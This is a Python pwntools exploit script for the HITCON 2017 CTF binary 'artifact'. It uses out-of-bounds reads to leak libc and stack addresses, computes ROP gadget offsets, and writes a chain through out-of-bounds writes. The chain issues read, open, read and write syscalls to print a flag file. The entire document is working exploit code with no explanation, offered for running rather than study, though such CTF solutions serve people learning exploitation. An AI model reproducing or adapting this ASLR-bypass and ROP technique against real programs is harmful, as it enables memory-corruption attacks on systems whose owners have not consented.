from pwn import *
context(arch='amd64', os='linux')
 
elf = ELF('hitcon17_artifact_artifact')
libc = ELF('./libc.so.6')
env = {'LD_PRELOAD' : libc.path}
r = elf.process(env = env)
 
def show(idx):
    r.recvuntil('Choice?\n')
    r.sendline('1')
    print (r.recvline())
    r.sendline(str(idx))
    print (r.recvuntil('is: '))
 
def memo(idx, num):
    print (r.recvuntil('Choice?\n'))
    r.sendline('2')
    print (r.recvline())
    r.sendline(str(idx))
    print (r.recvline())
    r.sendline(str(num))
 
def exit():
    print (r.recvuntil('Choice?\n'))
    r.sendline('3')
 
show(203)
 
libc_leak = int(r.recvline().split('\n')[0]) -241
op = libc_leak + (libc.symbols['open'] - libc.symbols['__libc_start_main'])
read = libc_leak + (libc.symbols['read'] - libc.symbols['__libc_start_main'])
write = libc_leak + (libc.symbols['write'] - libc.symbols['__libc_start_main'])
syscall = libc_leak + (0xbc765 - libc.symbols['__libc_start_main'])
 
log.success('libc start main addr: ' + hex(libc_leak))
log.success('op: ' + hex(op))
log.success('read: ' + hex(read))
log.success('write: ' + hex(write))
log.success('syscall: ' + hex(syscall))
 
show(202)
 
ebp_leak = int(r.recvline().split('\n')[0])
prax = libc_leak + (0x3a998 - libc.symbols['__libc_start_main'])
prdx = libc_leak + (0x1b92 - libc.symbols['__libc_start_main'])
prdi = ebp_leak - 0x1b2 + 0x215
prsi = libc_leak + (0x1fcbd - libc.symbols['__libc_start_main'])
bss = prdi + (0x202010 - 0xc13)
 
log.success('ebp_leak: ' + hex(ebp_leak))
log.success('pop rax ret: ' + hex(prax))
log.success('pop rdx ret: ' + hex(prdx))
log.success('pop rdi ret: ' + hex(prdi))
log.success('pop rsi ret: ' + hex(prsi))
log.success('bss: ' + hex(bss))
 
# read bss './flag'
memo(203, prdi)
memo(204, 0)
memo(205, prsi)
memo(206, bss)
memo(207, prdx)
memo(208, 10)
memo(209, prax)
memo(210, 0)
memo(211, syscall)
 
raw_input()
 
# open
memo(212, prdi)
memo(213, bss)
memo(214, prsi)
memo(215, 0)
memo(216, prdx)
memo(217, 2)
memo(218, prax)
memo(219, 2)
memo(220, syscall)
 
# read
memo(221, prdi)
memo(222, 3) # fd = 3?
memo(223, prsi)
memo(224, bss)
memo(225, prdx)
memo(226, 100)
memo(227, prax)
memo(228, 0)
memo(229, syscall)
 
# write
memo(230, prdi)
memo(231, 1)
memo(232, prax)
memo(233, 1)
memo(234, syscall)
 
exit()
 
r.interactive()
